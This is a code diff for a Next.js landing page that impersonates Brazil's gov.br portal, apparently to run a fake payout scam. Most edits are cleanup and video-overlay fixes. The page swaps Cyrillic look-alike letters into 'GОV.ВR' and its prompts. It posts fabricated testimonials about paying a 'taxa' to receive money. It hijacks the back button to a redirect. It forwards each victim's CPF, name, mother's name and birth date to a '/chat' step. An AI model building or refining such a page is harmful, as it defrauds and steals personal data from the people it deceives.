@@ -7,7 +7,7 @@ import Image from 'next/image';
 import { useRouter, useSearchParams } from 'next/navigation';
 import 'plyr-react/plyr.css';
 import type PlyrInstance from 'plyr';
-import '../offer-page.css'; 
+import '../offer-page.css';
 import {
   MoreVertical, Cookie, LayoutGrid, User, Menu, Search, CreditCard, CalendarDays, ThumbsUp, ThumbsDown, X, Loader2, VolumeX
 } from 'lucide-react';
@@ -43,8 +43,8 @@ function OfferContent() {
   const videoUrl = "https://225412.b-cdn.net/Video%20Page.mp4";
 
   const [pageLoading, setPageLoading] = useState(true);
-  const [showMainContent, setShowMainContent] = useState(false); 
-  
+  const [showMainContent, setShowMainContent] = useState(false);
+
   const [progress, setProgress] = useState(0);
   const [showThumbnailOverlay, setShowThumbnailOverlay] = useState(true);
   const [showResgateOverlay, setShowResgateOverlay] = useState(false);
@@ -63,10 +63,10 @@ function OfferContent() {
   const [comments, setComments] = useState<Comment[]>([]);
   const [totalComments, setTotalComments] = useState(25738);
   const [loadingCommentsText, setLoadingCommentsText] = useState('');
-  
+
 
   useEffect(() => {
-    const urlBackRedirect = '/back/index.html'; 
+    const urlBackRedirect = '/back/index.html';
     const query = searchParams.toString();
     const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + query;
 
@@ -80,8 +80,8 @@ function OfferContent() {
     };
     window.addEventListener('popstate', handlePopState);
     return () => window.removeEventListener('popstate', handlePopState);
-  }, []); // Runs once on mount
-  
+  }, []);
+
   useEffect(() => {
     const storedState = localStorage.getItem('offerPageState');
     if (storedState) {
@@ -90,7 +90,7 @@ function OfferContent() {
         if (state.videoStarted) setVideoStarted(state.videoStarted);
         if (state.videoCompleted) {
             setVideoCompleted(state.videoCompleted);
-            finalizeProgressAppearance(); 
+            // No need to call finalizeProgressAppearance here, the Plyr useEffect will handle it if player is ready
         }
         if (state.progressEnabled) setProgressEnabled(state.progressEnabled);
       } catch (e) {
@@ -113,7 +113,7 @@ function OfferContent() {
   const formatCPF = (cpf: string | undefined) => {
     if (!cpf) return '---';
     const onlyNums = cpf.replace(/\D/g, '');
-    if (onlyNums.length !== 11) return cpf; // Return original if not 11 digits after cleaning
+    if (onlyNums.length !== 11) return cpf;
     return onlyNums.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
   };
 
@@ -121,7 +121,7 @@ function OfferContent() {
     if (!dateStr) return '---';
     const dateOnly = dateStr.split(' ')[0];
     const [year, month, day] = dateOnly.split('-');
-    if (!year || !month || !day || year.length !== 4 || month.length !== 2 || day.length !== 2) return '---'; // Basic validation
+    if (!year || !month || !day || year.length !== 4 || month.length !== 2 || day.length !== 2) return '---';
     return `${day}/${month}/${year}`;
   };
 
@@ -139,24 +139,24 @@ function OfferContent() {
     async function fetchAndSetUserData() {
       if (!initialCpf) {
         setPageLoading(false);
-        setShowMainContent(true); 
+        setShowMainContent(true);
         setFetchError("CPF não encontrado nos parâmetros da URL.");
         console.warn("CPF not found in query params.");
         return;
       }
-      
+
       setPageLoading(true);
       setFetchError(null);
       try {
-        const response = await fetch(`/api/userData?cpf=${initialCpf}`); 
-        
+        const response = await fetch(`/api/userData?cpf=${initialCpf}`);
+
         if (!response.ok) {
           const errorData = await response.json().catch(() => ({ error: "Erro desconhecido ao processar resposta da API interna" }));
           console.error("Erro da API interna:", response.status, errorData);
           throw new Error(errorData.error || `Falha ao buscar dados do usuário. Status: ${response.status}`);
         }
         const data = await response.json();
-        
+
         if (data.dadosBasicos) {
           setUserData(data.dadosBasicos);
           setHeaderUserName(formatFullName(data.dadosBasicos.nome).split(' ')[0] || 'Usuáriо');
@@ -174,39 +174,32 @@ function OfferContent() {
         setShowMainContent(true);
       }
     }
-    
+
     fetchAndSetUserData();
   }, [initialCpf]);
-  
+
   const handleSaqueButtonClick = () => {
-    const newParams = new URLSearchParams(searchParams.toString()); // Preserve existing query params
-
-    // Determine CPF to use: userData.cpf has priority, then initialCpf from the URL
+    const newParams = new URLSearchParams(searchParams.toString());
     const cpfToFormat = userData?.cpf || initialCpf;
-    newParams.set('cpf', formatCPF(cpfToFormat)); // formatCPF handles undefined by returning '---'
-
-    // Set other user data from userData if available; format functions handle undefined inputs
+    newParams.set('cpf', formatCPF(cpfToFormat));
     newParams.set('nome', formatFullName(userData?.nome));
     newParams.set('mae', formatFullName(userData?.mae));
     newParams.set('nascimento', formatDateBR(userData?.nascimento));
-    
+
     const targetUrl = `/chat?${newParams.toString()}`;
     router.push(targetUrl);
   };
-  
+
   const handleThumbnailClick = async () => {
     if (playerRef.current?.plyr) {
       try {
-        playerRef.current.plyr.muted = false; // Unmute first
-        await playerRef.current.plyr.play(); // Then play
+        playerRef.current.plyr.muted = false;
+        await playerRef.current.plyr.play();
         setShowThumbnailOverlay(false);
-        // If autoplay was true and muted, progress might already be enabled.
-        // Ensure it's enabled now that user interacted.
-        if (!progressEnabled) setProgressEnabled(true); 
+        if (!progressEnabled) setProgressEnabled(true);
         if (!videoStarted) setVideoStarted(true);
       } catch (error) {
         console.error("Error trying to play/unmute video:", error);
-        // Fallback or user notification could be added here
       }
     }
   };
@@ -216,14 +209,22 @@ function OfferContent() {
       setStatusMessage("Saque liberado.");
       setShowSaqueButton(true);
       setProgress(100);
+      setShowThumbnailOverlay(false); // Hide thumbnail when resgate overlay appears
   }
 
   const handleVideoEnd = () => {
     if (!videoCompleted) {
         setVideoCompleted(true);
-        finalizeProgressAppearance();
+        // finalizeProgressAppearance will be called by the useEffect watching videoCompleted
     }
   };
+
+  useEffect(() => {
+    if (videoCompleted) {
+        finalizeProgressAppearance();
+    }
+  }, [videoCompleted]);
+
 
   useEffect(() => {
     const plyr = playerRef.current?.plyr;
@@ -233,35 +234,53 @@ function OfferContent() {
         const percent = (plyr.currentTime / plyr.duration) * 100;
         setProgress(percent);
         if (percent >= 99.9 && !videoCompleted) {
-          handleVideoEnd();
+          handleVideoEnd(); // This will set videoCompleted, triggering the other effect
         }
       };
       const onPlay = () => {
-        if (!videoCompleted) { 
+        if (!videoCompleted) {
           if (!videoStarted) setVideoStarted(true);
-          // Enable progress tracking as soon as play starts, even if initially muted by autoplay
-          if (!progressEnabled) setProgressEnabled(true); 
+          if (!progressEnabled) setProgressEnabled(true);
+           // If video starts playing (even muted autoplay) and thumbnail is visible, hide it.
+           // This covers user clicking play if somehow clickToPlay was true, or if autoplay unmuted.
+           // The main scenario for unmuting is handleThumbnailClick.
+           if (showThumbnailOverlay && !plyr.muted) {
+            setShowThumbnailOverlay(false);
+           }
+
         } else if (videoCompleted) {
-            plyr.pause(); 
+            plyr.pause();
         }
       };
       const onEnded = () => {
-        handleVideoEnd();
+        handleVideoEnd(); // This will set videoCompleted
       };
 
       plyr.on('timeupdate', onTimeUpdate);
       plyr.on('play', onPlay);
       plyr.on('ended', onEnded);
-      
-      if (videoCompleted) {
-        finalizeProgressAppearance();
-        setShowThumbnailOverlay(false); 
-      } else if (videoStarted && plyr.autoplay && plyr.muted) { // If autoplay started it muted
-        setProgressEnabled(true); // Progress should reflect muted autoplay
-        setShowThumbnailOverlay(true); // Keep thumbnail for unmuting
-      } else if (videoStarted) { // Video started by user click or unmuted autoplay
+
+      // Logic to manage thumbnail visibility based on player state
+      if (!videoCompleted) {
+        if (videoStarted && plyr.autoplay && plyr.muted) {
+          // Video has started via muted autoplay, is not complete, ensure thumbnail is visible for unmuting.
+          // This is crucial for reloads where videoStarted might be true from localStorage.
+          if (!showThumbnailOverlay) {
+            setShowThumbnailOverlay(true);
+          }
+        } else if (videoStarted && !plyr.muted) {
+          // Video has started and is unmuted (likely by user via thumbnail or other means)
+          if (showThumbnailOverlay) {
+            setShowThumbnailOverlay(false);
+          }
+        }
+        // If !videoStarted, thumbnail remains its current state (default true, or false if clicked)
+      } else {
+        // Video is completed, finalizeProgressAppearance handles hiding thumbnail.
+      }
+
+      if (videoStarted) {
         setProgressEnabled(true);
-        setShowThumbnailOverlay(false);
       }
 
 
@@ -277,7 +296,7 @@ function OfferContent() {
         }
       };
     }
-  }, [videoCompleted, videoStarted, progressEnabled, playerRef.current]); 
+  }, [videoCompleted, videoStarted, progressEnabled, playerRef.current, showThumbnailOverlay]);
 
 
   useEffect(() => {
@@ -302,12 +321,11 @@ function OfferContent() {
         likes: Math.floor(Math.random() * 100),
         dislikes: Math.floor(Math.random() * 20),
       };
-      setComments(prev => [newComment, ...prev.slice(0, 4)]); 
+      setComments(prev => [newComment, ...prev.slice(0, 4)]);
       setTotalComments(prev => prev + 1);
     };
-    
+
     const initialTexts = ["Tive medo, mas entrou R$ 2.400!", "Tive que pagar taxa, mas veio R$ 2.800 em 10min", "Recebi R$ 4.000 deu para pagar as contas kkk"];
-    // Only populate initial comments if comments array is empty
     if (comments.length === 0) {
         Promise.all(initialTexts.map(text => createNewComment(text)));
     }
@@ -323,11 +341,11 @@ function OfferContent() {
       ];
       createNewComment(messages[Math.floor(Math.random() * messages.length)]);
       setLoadingCommentsText("Comentários atualizados.");
-      setTimeout(() => setLoadingCommentsText(""), 2000); 
-    }, 10000); 
+      setTimeout(() => setLoadingCommentsText(""), 2000);
+    }, 10000);
 
     return () => clearInterval(commentInterval);
-  }, []); 
+  }, []);
 
 
   const plyrSource = useMemo(() => ({
@@ -336,11 +354,11 @@ function OfferContent() {
   }), [videoUrl]);
 
   const plyrOptions = useMemo(() => ({
-    controls: [], 
+    controls: [],
     hideControls: true,
-    clickToPlay: false, // Manually handle click via overlay
-    autoplay: true, // Autoplay enabled
-    muted: true, // Must be muted for autoplay to work in most browsers   
+    clickToPlay: false,
+    autoplay: true,
+    muted: true,
     playsinline: true,
   }), []);
 
@@ -410,7 +428,7 @@ function OfferContent() {
                   source={plyrSource}
                   options={plyrOptions}
                 />
-                {showThumbnailOverlay && (
+                {showThumbnailOverlay && !videoCompleted && (
                   <div className="thumbnail-overlay" onClick={handleThumbnailClick}>
                     <div className="thumbnail-content">
                       <h2>Сliquе<br />раrа оuvir</h2>
@@ -466,7 +484,7 @@ function OfferContent() {
               </div>
               {comments.map(comment => (
                 <div key={comment.id} className="comment-item">
-                  <Image className="comment-avatar" src={comment.avatar} alt="avatar" width={40} height={40} data-ai-hint="person avatar" unoptimized={true} />
+                  <Image className="comment-avatar" src={comment.avatar} alt="avatar" width={40} height={40} data-ai-hint="person avatar" unoptimized={true}/>
                   <div className="comment-content">
                     <div className="comment-name">{comment.name}</div>
                     <div className="comment-text" dangerouslySetInnerHTML={{ __html: comment.text }}></div>
@@ -491,14 +509,14 @@ function OfferContent() {
 export default function OfferPage() {
   return (
     <Suspense fallback={
-      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> 
-        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> 
-          <title>GОV.ВR</title> 
-          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> 
-            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> 
-            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> 
-          </text> 
-        </svg> 
+      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}>
+        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45">
+          <title>GОV.ВR</title>
+          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
+            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
+            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
+          </text>
+        </svg>
       </div>
     }>
       <OfferContent />
@@ -506,5 +524,3 @@ export default function OfferPage() {
   );
 }
 
-
-    
